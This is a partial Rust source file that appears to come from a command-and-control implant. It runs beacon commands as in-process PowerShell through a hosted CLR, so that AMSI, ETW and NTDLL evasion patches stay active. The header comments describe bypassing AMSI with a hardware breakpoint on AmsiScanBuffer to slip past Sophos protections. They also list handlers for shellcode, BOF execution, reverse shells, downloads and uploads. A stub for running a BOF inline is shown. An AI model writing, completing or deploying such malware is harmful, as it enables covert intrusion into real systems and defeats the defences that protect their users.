// exec.rs — In-process PowerShell execution via hosted CLR
//
// Commands dispatched by the beacon loop are run inside the current
// process using rustclr's PowerShell API. No powershell.exe child
// process is spawned — the CLR is hosted in-process so any AMSI,
// ETW, and NTDLL patches applied by the evasion component remain
// effective for every command.
//
// AMSI is handled at the native level by the amsi_hwbp evasion component
// which sets a hardware breakpoint on AmsiScanBuffer via DR1 + VEH.
// No memory patching, no PS-layer bypass — invisible to Sophos
// AmsiRegistrationProtection and AMSI itself can't scan the bypass.
//
// Non-PS control commands (BOF, shellcode, download, revshell, upload,
// !info) are handled natively before falling through to ps_exec so
// they work regardless of CLR state and don't get mis-parsed as PS.
//
// Pair with the 'ETW HWBP' or 'ETW Patch + NTDLL Unhook' evasion component.
...
fn ps_exec(cmd: &str) -> String {
    let ps = match PowerShell::new() {
        Ok(p)  => p,
        Err(e) => return format!("clr init error: {e}"),
    };

    // AMSI is handled at the native level by the amsi_hwbp evasion component
    // (hardware breakpoint on AmsiScanBuffer — no memory patching, no PS-layer
    // bypass that AMSI could scan and flag).

    match ps.execute(cmd) {
        Ok(out) => if out.trim().is_empty() { "OK".to_string() } else { out },
        Err(e)  => format!("ps error: {e}"),
    }
}

// ── Control handlers (identical to os_shell/exec.rs) ─────────────────────────
...
fn handle_bof_inline(arg: &str) -> String {
    ...
    unsafe {
        ...
        let _ = WaitForSingleObject(thread, 60_000);
        let _: Result<(), _> = CloseHandle(thread);
...
// ── !info — sysinfo via PEB/TEB/NtQueryInformationToken ──────────────────────
